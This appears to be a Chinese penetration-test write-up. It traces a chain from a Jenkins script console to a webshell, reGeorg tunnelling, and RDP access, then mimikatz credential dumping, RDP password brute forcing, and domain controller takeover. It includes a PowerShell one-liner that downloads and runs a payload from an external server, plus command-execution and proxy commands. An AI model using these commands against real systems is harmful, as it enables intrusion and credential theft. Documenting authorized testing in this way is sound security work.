目标
--

任务：从外网进入内网服务器，获取资产内网漫游，拿到域控

客户给定资产：<http://122.x.x.205:8080/>

### 0x01 入口

很幸运找到一个Jenkins漏洞 可以命令执行 默认system权限

通过`println "cmd.exe /c whoami".execute().text`执行命令得到结果为  
![1](https://shs3.b.qianxin.com/butian_public/f0ad2015c6bee02b6009169b0a23e7a9e.jpg)

简单收集了下信息：

***Windows2012 x64 内网服务器 存在杀软***

接着cs生成个powershell脚本进行转发，没有上线

```php
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://118.**.**.**/payload.ps1'))"
```

又换了mshta等等常见反弹手法，均失败，且没有回显，ping百度返回超时，判断服务器没有出网http协议的道已经走不通

尝试走dns隧道53端口协议反弹到cs，需解析配置好域名和vps地址，然后cs里开启dns监听，生成payload，但是dns生成的payload也得上传到shell里运行

![3](https://shs3.b.qianxin.com/butian_public/f934608deace3cef673c7cfdeb0674b65.jpg)

既然服务器http不通，远程下载payload并运行的方式也行不通，jsp的war包也不知道放在什么地方

但是发现，80端口开启，是iis管理器的默认主页

dir命令找到iis默认目录C:\\inetpub\\wwwroot\\，再使用echo写入一个asp一句话到网站根目录

***成功getshell***

![5](https://shs3.b.qianxin.com/butian_public/f2ada07726a911bae7bb36420c2e15b32.jpg)

计划传aspx大马，结果网站目录任何文件传不了，权限过小

![5](https://shs3.b.qianxin.com/butian_public/f616035bb5a82d8cda68d5fd986719ae9.jpg)

### 0x02提权之一波三折

**这里一波三折，后续复盘发现绕了很多弯路，但是作为测试当时的真实情况，记录出来让大家避坑**

看到iis权限那就先提个权，再弹个system权限到cs即可，使用了各种提权方法，均提权失败了  
尝试传exe文件发现网站就把我测试的ip封了，换和ip刷新文件夹发现缺exe传成功，但是文件破损了

发现服务器装了git工具，测试git clone <https://github.com/xxx/> 成功下载文件C:\\ProgramData\\

what?之前不是不出http协议网吗，netstat -ano看了下  
![5](https://shs3.b.qianxin.com/butian_public/f94f980183361513e0c28cf8b55f5a044.jpg)

发现有些端口与其他外网的443有连接,所以git clone可以远程下载，这里依次执行了exe、py、ps1都无法上线

突然想到在Jenkins里是system权限，于是找了个可写目录传aspx大马，接着move到网站根目录，拿到aspx大马

![5](https://shs3.b.qianxin.com/butian_public/f18c575e5793a93e8702ca39a6160e087.jpg)  
![5](https://shs3.b.qianxin.com/butian_public/f3e04efde624e6f2b8bedea281fec03d6.jpg)

在C:\\ProgramData\\ 目录传了dns协议生成的ps木马，执行没反应，传raw生成的木马放到shellcode免杀里生成exe，执行也无回显

但是另一个朋友说他生成的上线了，自己测试，shell内执行一直转圈也不上线 。无头绪了，已经**凌晨四点**了，明天再搞（后来设置监听为http 监听端口为443 即可上线）

### 0x03内网转发

起床后理一理思路

既然上不线，用reGeorg转发不也一样，把tunnel.aspx到C:\\ProgramData\\ move到iis目录访问  
成功访问  
![5](https://shs3.b.qianxin.com/butian_public/f6ba019ea1a15ed5dd7131a62a045bd4e.jpg)

OK，本地reGeorg.py监听并配置Proxifier

`python reGeorgSocksProxy.py -p 446 -u http://122.**.**.**/tunnel.aspx`  
![5](https://shs3.b.qianxin.com/butian_public/f3ed81ed5c8a6ba0ae9803b6b3f2dba8e.jpg)

Proxifier配置：

![5](https://shs3.b.qianxin.com/butian_public/f186b0db968744d3222855b2ef9c666c6.jpg)

远程连接即可  
![5](https://shs3.b.qianxin.com/butian_public/f4cbea54e94bb5b778aab1678114177c5.jpg)  
提示当前允许连接的用户过多

解决方案： mstsc /admin /v:192.168.15.82

![5](https://shs3.b.qianxin.com/butian_public/fa135e91e4764bceec2c11f05957d8efb.jpg)

然后还是无法连接

解决方法：  
`在\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`  
目录下新建项，在名称中输入`CredSSP，在CredSSP`上右键单击选择 新建》项 名称中输入Parameters确定，在Parameters上右键单击新建》DWORD（32位）值（D）修改名称为AllowEncryptionOracle 。在AllowEncryptionOracle 上右键单击选择修改，将“数值数据（V）”改为2，

此时确定，关闭所有重新打开mstsc连接发现可以用了。`  
![5](https://shs3.b.qianxin.com/butian_public/fdc6947bb53c6861ef8ea2797cc8b0812.jpg)  
成功登录: mstsc /admin /v:192.168.52.18  
![5](https://shs3.b.qianxin.com/butian_public/f9ad63573ccb905dd5fcd8f43e3f92a46.jpg)  
致此前渗透阶段完成。

### 0x04横向渗透

上传mimikatz抓到当前机器administertor密码

使用超级弱口令扫了下整个b段的rdp，字典内加入抓取到的administertor密码，成功扫到8台机器

![后渗透](https://shs3.b.qianxin.com/butian_public/f24a460b3ea75bfe3f5566bb4934291d6.jpg)  
并且成功上线cs马

在这台机器的cs里执行hashdump获取登录凭证，并横向到192.168.15.70和76机器

![5](https://shs3.b.qianxin.com/butian_public/fdf6558b829c5f2c8eba84e3e24d73a8a.jpg)

![5](https://shs3.b.qianxin.com/butian_public/f73c2c14318fa89404cc0d36150777114.jpg)

![5](https://shs3.b.qianxin.com/butian_public/fabc22d6729ac56f3a9f9c4916f54db69.jpg)

可以看到成功横向上线

经过常规的信息收集，找到192.168.15.14这台机器为域控  
到76机器执行mimikatz抓取域用户密码，尝试登录域控没有成功，可能权限不够  
接着去看70机器，发现有个ssm服务，（sqlserverManage）此进程极大可能是域管运行，所以这台机器内存中可能存在域管密码，mimikatz抓取  
![5](https://shs3.b.qianxin.com/butian_public/f483d21b9d80cf1fda5cf84aaa8846a5f.jpg)

```php
Username : Supertrans
 Domain   : TRANSASIA
 Password : XXXXXXX
```

![5](https://shs3.b.qianxin.com/butian_public/f77fd1b1ef660c2b221f7cde2fb8e6ea5.jpg)

至此成功拿下域控。

### 0x05技术总结

1、通过Jenkins获取入口

2、各种折腾提权以及转发

3、收集主机密码

4、通过收集的密码爆破B端机器

5、通过B端权限抓取域控密码

6、获取域控权限